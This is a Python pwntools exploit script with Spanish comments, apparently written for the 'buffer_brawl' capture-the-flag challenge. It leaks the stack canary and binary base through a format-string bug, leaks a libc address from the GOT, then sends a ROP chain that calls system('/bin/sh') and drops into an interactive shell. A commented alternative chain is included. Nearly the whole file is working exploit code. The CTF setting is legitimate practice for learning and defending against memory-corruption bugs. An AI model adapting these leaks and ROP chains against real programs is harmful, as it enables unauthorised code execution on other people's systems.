from pwn import *
exe = context.binary = ELF("buffer_brawl")
libc = context.binary = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("./libc6_2.35-0ubuntu3.8_amd64.so")
# io = connect("buffer-brawl.chal.wwctf.com", 1337)
# io = connect("localhost",4444)
io = process(exe.path)

# 1.Obtener la direccion base del binario
def stack_leak(p):
    print(f"INPUT={p}")
    io.sendline(b"4")
    io.recvuntil(b"Right or left?\n")
    io.sendline(p)
    return io.recvline(keepends=False)

cookie, exe_leak = stack_leak(b"%11$p %13$p").split()
cookie = int(cookie[2:], 16)                              # Canario
exe_leak = int(exe_leak[2:], 16)                          # Direccion filtrada
exe.address = exe_leak - 0x1747                           # desplazamiento de la direccion de retorno a la base


# 2.Obtener la direccion base de libc
def leak_got(sym):
    addr = stack_leak(b"%7$s".ljust(8, b"_") + p64(exe.got[sym]))
    addr = u64(addr[:6] + b"\x00\x00")
    return addr

puts_addr = leak_got("puts")
io.info(f"{leak_got("puts")=:x}")
""""
# Usado para encontrar la version de libc correcta en el remoto
io.info(f"{leak_got("printf")=:x}")
io.info(f"{leak_got("read")=:x}")
io.info(f"{leak_got("exit")=:x}")
""" 

libc.address = puts_addr - libc.sym.puts

# 3.Lanzar golpes al stack hasta dejarlo en 13
for i in range(29):
    io.sendlineafter(b"\n> ", b"3")


# 4.ROP
payload = cyclic(24)
payload += p64(cookie)
payload += cyclic(8)
payload += p64(libc.address+0x0000000000043047)  # pop rax; ret
payload += p64(libc.sym.system)                  
payload += p64(libc.address+0x000000000002d114)  # pop rdi; jmp rax

payload += p64(next(libc.search(b"/bin/sh")))    # rdi

""" 
# Otra forma mas sencilla usando el objeto rop
rop = ROP([exe, libc])
rop.raw(rop.ret.address)                             # Alinear el stack
rop.call("system", [next(libc.search(b"/bin/sh"))])

payload = flat(
    cyclic(24),
    p64(cookie),
    cyclic(8),
    rop.chain(),
)
"""


io.sendline(payload)
io.success("PWNED")
io.interactive()
